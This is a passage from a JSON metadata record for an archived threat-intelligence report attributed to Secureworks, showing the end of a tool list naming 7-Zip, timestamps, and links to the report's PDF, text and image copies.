                "7-ZIP"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1683339002,
    "ts_updated_at": 1743041645,
    "ts_creation_date": 1683252360,
    "ts_modification_date": 1683252360,
    "files": {
        "pdf": "https://archive.orkl.eu/6ae8c2791bb604905b3eff540f5efb126d2a455a.pdf",
        "text": "https://archive.orkl.eu/6ae8c2791bb604905b3eff540f5efb126d2a455a.txt",
        "img": "https://archive.orkl.eu/6ae8c2791bb604905b3eff540f5efb126d2a455a.jpg"
    }
}